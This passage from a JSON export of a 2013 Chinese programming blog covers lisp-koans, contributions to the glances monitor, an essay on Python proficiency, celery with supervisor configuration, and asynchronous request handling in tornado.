    "content": "####前言\n\n我记得在什么地方说过一个程序员要学什么语言:汇编,C,lisp,还有一门脚本语言(python或者ruby).遗憾的是我只会一点python和一点点ruby. \n最近关注到google出品了[lisp_koans](https://github.com/google/lisp-koans)-一个给初学者学习commonlisp的好东西,也许你也没有听过ruby_koans\n和python_koans,假如你已经回了这2门语言可以忽略假如你想学习这2门语言,从koans入手是一个很好地途径.\n最近几天花了些时间完成了lisp_koans,把答案分享出来[lisp-koans-answer](https://github.com/dongweiming/lisp-koans-answer)\n\n我也给python_koans贡献了几行代码,在入职培训要求通过几种koans,xx_koans其实是一些测试用例,就像过关题目,他涉及这个语言的方方面面.只能你提供了正确的答案\n才能继续下一个题目\n\n####为啥分享答案\n\n1. 做过python_koans的都记得，当某一题目你的答案不是期望的值的时候，这个测试没有通过，但是会提示你正确的结果,但是lisp_koans不会，你可以在不明所以的情况下需要研究很久\n\n1. lisp_koans还很新(2013.05), 而且本来lisp语言就很小众. 不像ruby和python那样广泛.你不能从stackoverflow或者stackexchange找到答案\n\n####让我们一起学习common lisp吧\n",
    "date": {
      "year": "2013",
      "month": "July",
      "day": "28"
    }
  },
  {
    "id": 276,
    "title": "使用glances监控本地和远程服务器的性能状态，以及我对它的修改",
    "category": "运维",
    "tags": [
      "glances"
    ],
    "url": "/archives/shi-yong-glancesjian-kong-ben-di-he-yuan-cheng-fu-wu-qi-de-xing-neng-zhuang-tai-%2Cyi-ji-wo-dui-ta-de-xiu-gai/",
    "content": "####前言\n\n首先开始感谢[Vpsee](http://www.vpsee.com)的那篇[安装和使用系统监控工具 Glances](http://www.vpsee.com/2013/07/a-new-system-monitoring-tool-glances-installation-and-usage/)，让我发现了[glances](https://github.com/nicolargo/glances)这个新的系统监控工具.并且可以通过xml-rpc\n监控远程服务器的系统情况显示到本地.它其实类似于top,支持键盘按键.使用了psutil库获取了硬盘分区，负载，内存使用，交换分区使用，进程(支持根据cpu占用,内存占用，进程名和\nio使用的排序).并且在安装了lm-sensor后还可以监控服务器的温度.记录日志,高亮显示可配置的阀值的预警颜色.就像一个超级版的top,但是它的优点其实就是2个:\n\n1. 它是python的，你可以定制化\n1. 它可以使用rpc获取其他服务端的系统信息,top可不行额\n\n\n####我对它做了些贡献\n\n\n1. 首先我给他添加了中文的国际化,但是因为显示英文比汉语占用得长度要小，我没有在太多的地方全部显示中文，而且我觉得作为运维本来就应该好好用英语...如果有必要我可以做一个glance-cn，完全汉化\n1. 我读了它的源码,发现它的代码已经超过4000行，但是好几个地方其实有很大的优化空间,比如它的glancesScreen类，有下面这样的代码:\n\n\n```python\n    def __getMemAlert(self, current=0, max=100):                               \n        # If current < CAREFUL of max then alert = OK                          \n        # If current > CAREFUL of max then alert = CAREFUL                     \n        # If current > WARNING of max then alert = WARNING                     \n        # If current > CRITICAL of max then alert = CRITICAL                   \n        try:                                                                   \n            variable = (current * 100) / max                                   \n        except ZeroDivisionError:                                              \n            return 'DEFAULT'                                                   \n                                                                               \n        if variable > limits.getMEMCritical():                                 \n            return 'CRITICAL'                                                  \n        elif variable > limits.getMEMWarning():                                \n            return 'WARNING'                                                   \n        elif variable > limits.getMEMCareful():                                \n            return 'CAREFUL'                                                   \n                                                                               \n        return 'OK'                                                            \n                                                                               \n    def __getMemColor(self, current=0, max=100):                               \n        return self.__colors_list[self.__getMemAlert(current, max)]            \n                                                                               \n    def __getMemColor2(self, current=0, max=100):                              \n        return self.__colors_list2[self.__getMemAlert(current, max)]           \n                                                                               \n    def __getSwapAlert(self, current=0, max=100):                              \n        # If current < CAREFUL of max then alert = OK                          \n        # If current > CAREFUL of max then alert = CAREFUL                     \n        # If current > WARNING of max then alert = WARNING                     \n        # If current > CRITICAL of max then alert = CRITICAL                   \n        try:                                                                   \n            variable = (current * 100) / max                                   \n        except ZeroDivisionError:                                              \n            return 'DEFAULT'                                                   \n                                                                               \n        if variable > limits.getSWAPCritical():                                \n            return 'CRITICAL'                                                  \n        elif variable > limits.getSWAPWarning():                               \n            return 'WARNING'                                                   \n        elif variable > limits.getSWAPCareful():                               \n            return 'CAREFUL'                                                   \n                                                                               \n        return 'OK'                                                            \n                                                                               \n    def __getSwapColor(self, current=0, max=100):                              \n        return self.__colors_list[self.__getSwapAlert(current, max)]           \n                                                                                                                                                                                  \n    def __getSwapColor2(self, current=0, max=100):                             \n        return self.__colors_list2[self.__getSwapAlert(current, max)]       \n```\n\n我来分析下,每种模块都有__getXXXAlert，__getXXXColor， __getxxxColor2，其中__getXXXColor， __getxxxColor2都会调用__getXXXAlert,他们的参数可能不同\n\n你看到了很多好相似的代码了嘛?其实待遇代码的可读性和可理解性已经代码的紧凑和不易懂一直就需要一个折中，我提了一个pull request，其实对这个类的属性做了下拦截\n\n\n```python\n# 使用__getattr__是为了只获取类中没有定义的属性\ndef __getattr__(self, name):                                               \n        base_type = ['Mem', 'Swap', 'Fs', 'HDDTemp', 'Sensors']                \n        get_alert_list = ['_glancesScreen__get' + m + 'Alert' for m in base_type]\n        base_type.extend(['Load', 'Cpu']) #我没有也处理_getCpu/LoadAlert,因为他们的调用略有不同,保留了\n        get_color_list = ['_glancesScreen__get' + m + 'Color' for m in base_type]\n        get_color_list2 = ['_glancesScreen__get' + m + 'Color2' for m in base_type]\n                                                                               \n        if name in get_alert_list:                                             \n            return partial(self.getAlert, name[19:-5].upper())                 \n        elif name in get_color_list:                                           \n            return partial(self.getColor, name[19:-5])                         \n        elif name in get_color_list2:                                          \n            return partial(self.getColor2, name[19:-6])                        \n                                                                               \n    def getColor(self, type, *args, **kwargs):                                 \n        \"\"\"                                                                    \n        default: current=0, max=100, stat='', core=1                           \n        \"\"\"                                                                    \n        return self.__colors_list[getattr(                                     \n            self, ''.join(['_glancesScreen__get', type, 'Alert']))(*args, **kwargs)]\n                                                                               \n    def getColor2(self, type, *args, **kwargs):                                \n        \"\"\"                                                                    \n        default: current=0, max=100, stat='', core=1                           \n        \"\"\"                                                                    \n        return self.__colors_list2[getattr(                                    \n            self, ''.join(['_glancesScreen__get', type, 'Alert']))(*args, **kwargs)]\n\n```\n\n--- update 2013-08-10 ----- \n\n它已经接收了我的代码\n\n1. 我在服务器用pip，安装的是1.6.1，而本地是1.7.1a，但是有一个功能hddtemp支持实在1.6.1之后添加的,我用本地使用-c连接远程服务器,本\n地有-y选项，但是远程是没有的，按'h'就会报错,我修改了这个问题\n\n####如何使用国际化\n\n1. 它自带了这个脚本i18n-gen.sh\n\n1. 我在我的gentoo和mac下都实验了,没有作用，难道是我理解有问题?\n\n首先我先把本地的locale换成中文:\n\n```\nexport LANG=zh_CN.UTF-8\n```\n后来我发现它使用国际化的原理是:\n\n1. 在安装的时候将.mo文件一起拷贝到glances的安装目录下得share/locale/XX/LC_MESSAGES下(XX代表你的生成的国际化名字)\n1. 它使用了这样的方法加载国际化\n\n```\nlocale.setlocale(locale.LC_ALL, '')\ngettext.install(__appname__)\n```\n\n但是没有去作用，因为没有找到.mo文件\n\n我提了pull req, 这样修改(其实就是去目录下找到那个语言的.mo):\n\n```\ncur_dir = os.path.split(os.path.realpath(__file__))[0]\ngettext.install(__appname__, '{0}/../share/locale'.format(cur_dir))\n```\n\n--- update 2013-08-10 -----\n\n它没有采用我的方法而是比较复杂的实现了\n\n\n我在想，难道以前得几种语言是可以实现的?其实原来的方式在程序目录下是可以的，但是setup.py install后目录结构变化了\n\n####远程连接服务器\n\n这是glances最大的一个特点，但是不能让谁都可以使用serverproxy链接查看你的状态吧?所以你需要指定-P选项，加一个随机密码(其实账号是glances，没有提供参数，在程序里面写死了)\n",
    "date": {
      "year": "2013",
      "month": "August",
      "day": "01"
    }
  },
  {
    "id": 277,
    "title": "你真的会python嘛?",
    "category": "python",
    "tags": [
      "python"
    ],
    "url": "/archives/ni-zhen-de-hui-pythonma/",
    "content": "####前言\n\n我这个博客一直都是一些技术分享,show code的地方，我从来没有写过个人生活或者情感杂谈,当然我也从来没有谈论过我对什么东西的喜恶.\n很多人喜欢喷XX语言，喜欢谈论XX和YY的优缺,甚至凑了一本不知所云的书...好吧,我觉得没有使用一门语言超过10年，没有对一个技术研究个5,6年，\n不好意思说自己懂(天才除外).我也觉得我没有资格讨论什么，也许我有我的观点看法，但是我怀着怀疑的心态看自己，生怕自己理解错了.\n下文纯属个人吐槽,也许没有指定路怎么走，只是希望提个醒...\n\n使用python2年，可喜的是python被越来越多的人接受，甚至前端工程师...但是却有点烂大街的感觉:感觉出门不聊几句python都不好意思和人打招呼.但是你真的懂python嘛?\n\n\n####你会python真的不重要\n\npython实在太好学习了,假如你会其它的语言，可能搞本书翻一翻，一周后就能写很高端的python程序，由于web框架的普及，你甚至可以让一个网站应用跑起来. 你会我也会，你有什么竞争力?\n\n####你知道python怎么用嘛?\n\n1. 在什么时候需要使用OOP？\n1. 在什么时候使用类装饰器?\n1. 你用过元类嘛?\n1. 在什么时候用静态方法什么时候使用类方法?\n1. 你了解那些管理属性? `__call__` ,  `__init__` , `__new__`都是在什么时候被触发?`__getattr__`和`__getattribute__`应用有什么不同?\n1. 你知道标准库里面的多少个模块?你能在需要的时候知道这个功能其实标准库里面已经实现了?\n1. 什么时候用回调？\n1. 什么时候用signal？假如你会django你知道django的signal是什么?你了解orm嘛?\n1. asyncore，contextlib， functools， collections， heapq，itertools， SocketServer， weakref，operator(知道3个就算)这些你会几个？\n1. python的多态是什么?\n1. 在什么场景可以尝试python的设计模式中的XX(能想到2个场景就算)?\n1. 在什么时候可以使用Mixin？\n1. 在什么时候可以使用python的闭包？\n1. 你曾经用过yield嘛？生成器和迭代器的区别和应用场景是什么?\n1. 在什么可以使用python的函数式编程?\n1. __future__模块里面都有什么定义的用法?\n\n\n提笔想了这上面16点我认为体现python的东西，假如你不能有效的回答上面1/4, 好吧不要和我说你原来是会python的，踏实下来..你的路还很长.假如你回答不超过一半,我提醒你-你只是刚入行而已(这是我的角度)\n\n\n#### 假如我是一个入职后的带新人的引导者\n\n1. 学好git... 呵呵\n1. 假如新人还不熟悉python,python_koans是个不错的入门选择\n1. 首先就是严格的代码规范，加上团队的文化以及风格.\n1. 我会给一个任务，比如一周内写个多线程的socket命令行聊天程序,支持群组，加好友，群聊，发送文件等功能，看新人能力而定\n1. 而后把项目一部分略棘手的工作教给他，注意这里是生产环境，在他完成任务的过程中会熟悉我们的上线/code review/代码风格等东西\n1. 我希望整个团队一起贡献一个基础的公共库，包含一些常用的功能，然后新人首先学习这些东西，以后就不需要浪费时间造轮子，但是可以修改完善公共库，\n这个公共库可以在新服务器部署时候直接使用pypi或者ubuntuPPA安装进来\n\n#### 什么算是好的python代码?\n\n假如你的代码没使用pep8检验过，你.... 最差你也要使用[autopep8](https://github.com/hhatto/autopep8)格式化差劲的代码吧?如果你想对自己的代码质量有要求，我强烈建议你了解什么是pythonic:\n\n1. doughellmann(<python标准库>的作者)的[an-introduction-to-the-zen-of-python](http://www.slideshare.net/doughellmann/an-introduction-to-the-zen-of-python)\n1. [be-pythonic](http://sssslide.com/www.slideshare.net/hychen/be-pythonic-14859746)\n\n#### 代码易懂但是堆了很多/代码难懂但是精炼之间的取舍\n\n我想很多对代码有追求的人, 会看见项目中存在大量，没有被重用的函数，似曾相似的方法甚至方法的名字...\n我是极为见不得ugly或者华而不实的代码的人, 但是有个问题. 我封装的代码很不直观，难懂..原来的代码貌似极为好懂.每个人都有自己的理解吧.就象我的团队里面有人说django代码太难懂，因为它们有django项目组的文化...\ncelery代码写的不好这样的安慰似的评论...但是我不这样认为,我还在读celery代码，我也承认里面是有作者风格的取名或者实现的方式，但是我学到了很多.\n\n通过看开源代码，比如django，requests，flask. 我会发现和总结很多别人的用法，思考别人为啥这样用.比如项目代码目录结构，解决一些问题使用的方式. 还有一些pep8中没有提到的规范. 比如一些代码实用的风格，举个例子：\n\n我们的代码引用其它模块是这样的:\n\n```python\nfrom test import long_long_long_test1\nfrom test import long_long_long_test2\nform test import long_long_long_test3\n```\n\n省略20多行，很脑残吧? 有一种风格是\n\n```python\nfrom test import long_long_long_test1, \\\n                 long_long_long_test2, \\\n                 long_long_long_test3\n```\n\n说一个技巧:当我不知道该用什么，去看很NB项目怎么用\n结果django和requests是这样的风格\n\n```python\nfrom test import (long_long_long_test1,\n                  long_long_long_test2,\n                  long_long_long_test3)\n```\n\n怎么样进步?不是闭门造车..先去看看别人是怎么用的..\n\n\n比如我以前拼接一个文件路径都是这样:\n\n```python\n'{0}/{1}'.fotmat(dir, filename)\n```\n\n其实人家本来有:\n\n```python\nos.path.join(dir, filename)\n```\n\n很惭愧.然后花了半个小时，把以前我这样用的地方全改了\n\n这是我说的重要的一点: 知道了什么是对的 就要改....\n\n对于这个主题, 我的答案是: 我喜欢难懂但是精炼的代码. 境界就是你看的懂就能写的出来.\n假如你连这点代码都看不懂.你看不了开源项目的做法.你会一直是个堆代码的码农..你会一直在堆着垃圾的代码.你会增加未来接手人的维护成本\n\n#### 怎么样提高python可读性和质量\n\n以下是我的想法\n\n1. 首先给函数/类/方法取个好懂的名字(我这点很失败，英语太烂...是不是应该加一个学好英语)\n1. 当一个差不多的操作出现了三次，不要继续堆代码，要抽象出来\n1. 我倾向于写FIXME，TODO, 写文件/函数的用途的注释，在不是很好理解的代码上面注释作用，标明输入和输出都是什么(如果不是要修改维护你的代码，没人在乎你的算法多NB)\n1. 上面说的，请不要让别人需要仔细研究你的代码才明白是什么意思.. 我写代码很有压力，因为我不想以后维护我代码的人骂我.\n1. 不要炫技，请不要乱用函数式编程/闭包.我在乎的是性能和简单粗暴的实现功能\n1. 多用标准库的实现，如果不知道有这个功能实现前先google.\n1. 多读有名的项目，github上面有很多.思考别人为什么这样用\n\n....\n\n#### 我们是封装开源项目还是直接修改开源代码给自己用\n\n其实我这样描述,比如有个项目因为历史原因是一个很早的版本.但是和其它新的版本组件有兼容问题以及我们业务的特殊需要.我看了源码发现需要改动几个地方.\n问题改动后就需要自己维护这个项目，对于新部署的环境甚至其它版本我还继续需要这个变动. 还有一种声音是\"你不能修改XX源码\",你要在上面封装出一个新的东西，\n也就是不直接调用XX，而是在我的自己的项目对XX有了个封装YY，然后我们的调用YY.\n\n我觉得这个东西自己部署是一个可行的方案，首先这个修改不是一个patch，不是主流的修改.只能算是我们业务的二次开发而已，封装只是在掩耳盗铃.\n着让我想起一个问题:为什么中国鲜有好的开源项目:中国人不缺好的idea?是因为中国人觉得这件事情做不了，是因为它们觉得别人实现的就是很牛比的，\n自己改了就会有问题...其实这是自卑..首先是代码就会有bug，tornado/flask/requests不还是在开发和解决问题嘛？bug一直在只是你没有发现和注意.\n我觉得开源项目的代码看懂了，了解了就可以修改..没什么可担心的...我指的是角度.我觉得每个人学了一门语言看了某个项目的源码只要你有胆量，\n你有一个怀疑的善于发现和思考的心，那么你都能贡献你的代码，做你的二次开发.\n\n和本文相关: 如果你没有做过这件事，你怎么可以说你会python?\n\n#### 我的感想\n\n我不赞同\"做好工作就好了\"的调调.对你个人来说你明年今天做的事情和现在是一样的，不同的是你老了一岁.\n如果是为了完成工作而完成工作. 其实你这个代码就是线上运行的代码，并且是以后很长时间再用的版本，你随意的一些代码会在很久之后很难的变动..\n我也不同意一上来就把你的程序写的能承受千万级PV的架构.我认为对于现在项目状态，我要思考大约未来一年可能的发展，它如何简单的扩展就好了..\n",
    "date": {
      "year": "2013",
      "month": "August",
      "day": "02"
    }
  },
  {
    "id": 278,
    "title": "使用celery之了解celery",
    "category": "celery",
    "tags": [
      "celery"
    ],
    "url": "/archives/shi-yong-celeryzhi-liao-jie-celery/",
    "content": "####前言\n\n我想很多做开发和运维的都会涉及一件事:crontab, 也就是在服务器上设定定时任务,按期执行一些任务.但是假如你有上千台的服务器，\n你有上千种任务,那么对于这个定时任务的管理恐怕是一件很头疼的事情.哪怕你只是几十个任务分配的不同的机器上怎么样合理的管理和实现以下功能呢:\n\n1. 查看定时任务的执行情况.比如执行是否成功，当前状态，执行花费的时间.\n1. 一个友好的界面或者命令行下实现添加,删除任务\n1. 怎么样简单实现不同的机器设定不同种任务,某些机器执行不同的队列\n1. 假如你需要生成一个任务怎么样不阻塞剩下来的过程(异步了呗)\n1. 怎么样并发的执行任务\n\n####几种选择\n\n1. 有钱有人有时间自己实现一套,优点是完全符合公司业务的需要,有专门的团队维护和服务\n1. 使用[Gearman](http://gearman.org/),听说过没用过，因为是C/java/perl,对我们这种python开发者或者运维来说,假如没有这方面经验之后没有能力了解底层实现和二次开发的能力\n1. 使用[rq](http://python-rq.org/), rq是搞gitflow的那个作者写的，简介里面说的很清楚:Simple job queues for Python. 怕它不够复杂,但是假如业务没有那么复杂或者应用不是那么严格，完全可以尝试下\n1. 好吧我选择了[celery](https://github.com/celery/celery), 现在用了快半年，可能是历史遗留问题,版本较低.有很多坑.但是很不错\n\n####消息队列\n\nRabbitMQ,ZeroMQ这样的消息队列总是出现在我们视线中, 其实意义是很简单: 消息就是一个要传送的数据,celery是一个分布式的任务队列.这个\"任务\"其实就是一种消息,\n任务被生成到队列中，被RabbitMQ等容器接收和存储，在适当的时候又被要执行的机器把这个消息取走.\n\ncelery任务可以使用RabbitMQ/Redis/SQLAlchemy/Django的orm/Mongodb等等容器(这里叫做Broker).我使用的是RabbitMQ,因为作者在github主页的介绍里面很明确的写了这个\n\n所谓队列,你可以设想一个问题,我有一大推的东西要执行,但是我并不是需要每个服务器都执行这个任务,因为业务不同嘛. 所以就要做个队列, 比如任务A,B,C A可以在X,Y服务器执行,\n但是不需要或者不能在Z服务器上执行.那么在X,Y你启动worker(下面会说，其实就是消费者和生产者的消费者)加上这个队列,Z服务器就不需要指定这个队列,也就不会执行这个队列的任务\n\n#####celery的原理,我这里的角度是django+celery+django-celery\n\n首先说一下流程:\n\n1. 使用django-celery或者直接操作数据库(settings.py里面指定)添加任务,设置的相关属性(包含定时任务的间隔)存入数据库.\n1. celerybeat通过djcelery.schedulers.DatabaseScheduler获取django内你设置的任务周期性的检查(默认5s),发现需要执行某任务讲其丢入你设置的broker(我这里是rabbitmq),他会更具settings.py的设置放到对应的队列\n1. 在你启动了celery worker(以前是celeryd)的服务器上,根据worker也会定期(默认5s)去broker里面查找需要它执行的队列里面是否有任务\n1. 当发现队列有要执行的任务,worker将它取出来执行,执行完的结果通过celerycam(默认30s,所以这个进程也要启动)写入django设置的数据库,更新了这个任务的状态.比如花费的时间\n\n####supervisor进程管理\n\n不知道有没有人用过[supervise](http://cr.yp.to/daemontools/supervise.html)，我以前经常在最初的项目开发中经常使用它监视我的程序,当程序死掉自动启动, [supervisor](https://github.com/Supervisor/supervisor)确是一个\n进程管理的工具，我在这里使用它管理celery的程序和uwsgi\n\n粘贴下我的一个本地环境的配置,并直接进行一下说明:\n\n```python\n;程序名字\n[program:celery-queue-fetch]\n;程序要执行的命令, -Q 指定了生成和接受任务的队列,多个用都好分开 -c为workr的数量,原意为并发数量\ncommand=python /home/dongwm/work/manage.py celery worker -E --settings=settings_local --loglevel=INFO -Q fetch_ -c 30\n;程序执行时候所在目录\ndirectory=/home/dongwm/work/\n;执行程序使用的用户\nuser=dongwm\n;启动的程序的实例数,默认是1\nnumprocs=1\nstdout_logfile=/home/dongwm/work/celerylog/celery.log\nstderr_logfile=/home/dongwm/work/celerylog/celery.log\n;在启动supervisor时候自动启动\nautostart=true\n;当程序可能因为某些原因没有启动成功会自动重启\nautorestart=true\n;启动的等待时候,我想是为了重启能杀掉原来进程预留的时间\nstartsecs=10\n;进程发送停止信号等待os返回SIGCHILD的时间\nstopwaitsecs=10\n;低优先级的会首先启动最后关闭\npriority=998\n;以下2句是为了保证杀掉进程和其子进程而不会只杀死其控制的程序主进程而留下子进程变为孤立进程的问题\nstopsignal=KILL\nstopasgroup=true\n\n[program:celery-queue-feed]\ncommand=python /home/dongwm/work/manage.py celeryd -E --settings=settings_local --loglevel=INFO -Q feed\ndirectory=/home/dongwm/work/\nuser=dongwm\nnumprocs=1\nstdout_logfile=/home/dongwm/work/celerylog/celery.log\nstderr_logfile=/home/dongwm/work/celerylog/celery.log\nautostart=true\nautorestart=true\nstartsecs=10\nstopwaitsecs=10\npriority=998\nstopsignal=KILL\nstopasgroup=true\n\n[program:celerycam]\n;任务快照的间隔时间为10s\ncommand=python /home/dongwm/work/manage.py celerycam -F 10 --settings=settings_local\ndirectory=/home/dongwm/work/\nuser=dongwm\nnumprocs=1\nstdout_logfile=/home/dongwm/work/celerylog/celerycam.log\nstderr_logfile=/home/dongwm/work/celerylog/celerycam.log\nautostart=true\nautorestart=true\nstartsecs=5\nstopwaitsecs=5\npriority=998\nstopsignal=KILL\nstopasgroup=true\n\n[program:celerybeat]\ncommand=python /home/dongwm/work/manage.py celerybeat --settings=settings_real_old --loglevel=DEBUG\ndirectory=/home/dongwm/work/\nuser=dongwm\nnumprocs=1\nstdout_logfile=/home/dongwm/work/celerylog/celery_beat.log\nstderr_logfile=/home/dongwm/work/celerylog/celery_beat.log\nautostart=true\nautorestart=true\nstartsecs=10\npriority=999\nstopsignal=KILL\nstopasgroup=true\n\n;这是supervisor官方的一个监控进程状态异常退出的脚本,我对它进行了较大的修改,这样在程序奇怪退出的时候会给我发邮件\n[eventlistener:crashmail]\ncommand=python /home/dongwm/superlance/superlance/crashmail.py -a -m ciici123@163.com\nevents=PROCESS_STATE_EXITED\n\n[program:uwsgi]\nuser = dongwm\nnumprocs=1\ncommand=/usr/local/bin/uwsgi -s /tmp/uwsgi-sandbox.sock --processes 4  --enable-threads \\\n     --pythonpath /home/dongwm/uwsgi --buffer-size 32768 --listen 100 --daemonize /home/dongwm/ulog/uwsgi_out.log\ndirectory=/home/dongwm/work\nautostart=true\nautorestart=true\nredirect_stderr=true\nstopsignal=KILL\nstopasgroup=true\n```\n\n####nginx+uwsgi的实践\n\nnginx进程数会直接影响性能, 如何使用到的模块不会出现阻塞式的调用，应该有多少cpu就配多少worker_processes,否则才需要配置更多的进程数.\n比如你的用户大量读取你的本地静态文件，并且服务器上面内存较少，硬盘的I/O调用可能会阻塞worker少量时间,那么就要多配\n\n为了更好利用多核的优势,我绑定了worker和对应的内核:\n\n```python\nworker_processes     4;\nworker_cpu_affinity 0001 0010 0100 1000;\n```\n",
    "date": {
      "year": "2013",
      "month": "August",
      "day": "10"
    }
  },
  {
    "id": 279,
    "title": "使用tornado让你的请求异步非阻塞",
    "category": "tornado",
    "tags": [
      "tornado"
    ],
    "url": "/archives/shi-yong-tornadorang-ni-de-qing-qiu-yi-bu-fei-zu-sai/",
    "content": "####前言\n\n也许有同学很迷惑:tornado不是标榜异步非阻塞解决10K问题的嘛?但是我却发现不是torando不好，而是你用错了.比如最近发现一个事情:某网站打开页面很慢,服务器cpu/内存都正常.网络状态也良好.\n后来发现，打开页面会有很多请求后端数据库的访问，有一个mongodb的数据库业务api的rest服务.但是它的tornado却用错了,一步步的来研究问题:\n\n####说明\n\n以下的例子都有2个url,一个是耗时的请求，一个是可以或者说需要立刻返回的请求,我想就算一个对技术不熟，从道理上来说的用户，\n他希望的是他访问的请求不会影响也不会被其他人的请求影响\n\n```python\n#!/bin/env python\n\nimport tornado.httpserver\nimport tornado.ioloop\nimport tornado.options\nimport tornado.web\nimport tornado.httpclient\n\nimport time\n\nfrom tornado.options import define, options\ndefine(\"port\", default=8000, help=\"run on the given port\", type=int)\n\nclass SleepHandler(tornado.web.RequestHandler):\n    def get(self):\n        time.sleep(5)\n        self.write(\"when i sleep 5s\")\n\nclass JustNowHandler(tornado.web.RequestHandler):\n    def get(self):\n        self.write(\"i hope just now see you\")\n\nif __name__ == \"__main__\":\n    tornado.options.parse_command_line()\n    app = tornado.web.Application(handlers=[\n            (r\"/sleep\", SleepHandler), (r\"/justnow\", JustNowHandler)])\n    http_server = tornado.httpserver.HTTPServer(app)\n    http_server.listen(options.port)\n    tornado.ioloop.IOLoop.instance().start()\n```\n\n假如你使用页面请求或者使用哪个httpie,curl等工具先访问http://localhost:8000/sleep,再访问http://localhost:8000/justnow.你会发现本来可以立刻返回的/jsutnow的请求会一直阻塞到/sleep请求完才返回.\n\n这是为啥?为啥我的请求被/sleep请求阻塞了？如果平时我们的web请求足够快我们可能不会意识到这个问题，但是事实上经常会有一些耗时的进程，意味着应用程序被有效的锁定直至处理结束.\n\n这是时候你有没有想起@tornado.web.asynchronous这个装饰器？但是使用这个装饰器有个前提就是你要耗时的执行需要执行异步,比如上面的time.sleep,你只是加装饰器是没有作用的，而且需要注意的是\nTornado默认在函数处理返回时关闭客户端的连接,但是当你使用@tornado.web.asynchonous装饰器时，Tornado永远不会自己关闭连接，需要显式的self.finish()关闭\n\n我们大部分的函数都是阻塞的, 比如上面的time.sleep其实tornado有个异步的实现:\n\n```python\n#!/bin/env python\n\nimport tornado.httpserver\nimport tornado.ioloop\nimport tornado.options\nimport tornado.web\nimport tornado.gen\nimport tornado.httpclient\nimport tornado.concurrent\nimport tornado.ioloop\n\nimport time\n\nfrom tornado.options import define, options\ndefine(\"port\", default=8000, help=\"run on the given port\", type=int)\n\nclass SleepHandler(tornado.web.RequestHandler):\n    @tornado.web.asynchronous\n    @tornado.gen.coroutine\n    def get(self):\n        yield tornado.gen.Task(tornado.ioloop.IOLoop.instance().add_timeout, time.time() + 5)\n        self.write(\"when i sleep 5s\")\n\n\nclass JustNowHandler(tornado.web.RequestHandler):\n    def get(self):\n        self.write(\"i hope just now see you\")\n\nif __name__ == \"__main__\":\n    tornado.options.parse_command_line()\n    app = tornado.web.Application(handlers=[\n            (r\"/sleep\", SleepHandler), (r\"/justnow\", JustNowHandler)])\n    http_server = tornado.httpserver.HTTPServer(app)\n    http_server.listen(options.port)\n    tornado.ioloop.IOLoop.instance().start()\n```\n\n这里有个新的tornado.gen.coroutine装饰器, coroutine是3.0之后新增的装饰器.以前的办法是用回调，还是看我这个例子:\n\n```python\nclass SleepHandler(tornado.web.RequestHandler):\n    @tornado.web.asynchronous\n    def get(self):\n        tornado.ioloop.IOLoop.instance().add_timeout(time.time() + 5, callback=self.on_response)\n    def on_response(self):\n        self.write(\"when i sleep 5s\")\n        self.finish()\n```\n\n使用了callback, 但是新的装饰器让我们通过yield实现同样的效果:你在打开/sleep之后再点击/justnow，\njustnow的请求都是立刻返回不受影响.但是用了asynchronous的装饰器你的耗时的函数也需要执行异步\n\n刚才说的都是没有意义的例子，下面写个有点用的:读取mongodb数据库数据，然后再前端按行write出来\n\n\n```python\n#!/bin/env python\n\nimport tornado.httpserver\nimport tornado.ioloop\nimport tornado.options\nimport tornado.web\nimport tornado.gen\nimport tornado.httpclient\nimport tornado.concurrent\nimport tornado.ioloop\n\nimport time\n# 一个mongodb出品的支持异步的数据库的python驱动\nimport motor\nfrom tornado.options import define, options\ndefine(\"port\", default=8000, help=\"run on the given port\", type=int)\n# db其实就是test数据库的游标\ndb = motor.MotorClient().open_sync().test\n\nclass SleepHandler(BaseHandler):\n    @tornado.web.asynchronous\n    @tornado.gen.coroutine\n    def get(self):\n        # 这一行执行还是阻塞需要时间的，我的tt集合有一些数据并且没有索引\n        cursor = db.tt.find().sort([('a', -1)])\n        # 这部分会异步非阻塞的执行二不影响其他页面请求\n        while (yield cursor.fetch_next):\n            message = cursor.next_object()\n            self.write('<li>%s</li>' % message['a'])\n        self.write('</ul>')\n        self.finish()\n\n    def _on_response(self, message, error):\n        if error:\n            raise tornado.web.HTTPError(500, error)\n        elif message:\n            for i in message:\n                self.write('<li>%s</li>' % i['a'])\n        else:\n            self.write('</ul>')\n            self.finish()\n\n\nclass JustNowHandler(BaseHandler):\n    def get(self):\n        self.write(\"i hope just now see you\")\n\nif __name__ == \"__main__\":\n    tornado.options.parse_command_line()\n    app = tornado.web.Application(handlers=[\n            (r\"/sleep\", SleepHandler), (r\"/justnow\", JustNowHandler)])\n    http_server = tornado.httpserver.HTTPServer(app)\n    http_server.listen(options.port)\n    tornado.ioloop.IOLoop.instance().start()\n```\n\n一个同事提示为什么这个耗时的东西不能异步的丢给某工具去执行而不阻塞我的请求呢?好吧，我也想到了:celery，正好github有这个东西:[tornado-celery](https://github.com/mher/tornado-celery)\n\n执行下面的程序首先你要安装rabbitmq和celery:\n\n```python\n#!/bin/env python\n\nimport tornado.httpserver\nimport tornado.ioloop\nimport tornado.options\nimport tornado.web\nimport tornado.gen\nimport tornado.httpclient\nimport tcelery, tasks\n\nimport time\n\nfrom tornado.options import define, options\ndefine(\"port\", default=8000, help=\"run on the given port\", type=int)\n\ntcelery.setup_nonblocking_producer()\n\nclass SleepHandler(tornado.web.RequestHandler):\n    @tornado.web.asynchronous\n    @tornado.gen.coroutine\n    def get(self):\n        # tornado.gen.Task的参数是:要执行的函数, 参数\n        yield tornado.gen.Task(tasks.sleep.apply_async, args=[5])\n        self.write(\"when i sleep 5s\")\n        self.finish()\n\nclass JustNowHandler(tornado.web.RequestHandler):\n    def get(self):\n        self.write(\"i hope just now see you\")\n\nif __name__ == \"__main__\":\n    tornado.options.parse_command_line()\n    app = tornado.web.Application(handlers=[\n            (r\"/sleep\", SleepHandler), (r\"/justnow\", JustNowHandler)])\n    http_server = tornado.httpserver.HTTPServer(app)\n    http_server.listen(options.port)\n    tornado.ioloop.IOLoop.instance().start()\n```\n\ntask是celery的任务定义的文件，包含我们说的time.sleep的函数\n\n```python\nimport time\nfrom celery import Celery\n\ncelery = Celery(\"tasks\", broker=\"amqp://guest:guest@localhost:5672\")\ncelery.conf.CELERY_RESULT_BACKEND = \"amqp\"\n\n@celery.task\ndef sleep(seconds):\n    time.sleep(float(seconds))\n    return seconds\n\nif __name__ == \"__main__\":\n    celery.start()\n```\n\n然后启动celelry  worker(要不然你的任务怎么执行呢?肯定需要一个消费者取走):\n\n```python\ncelery -A tasks worker 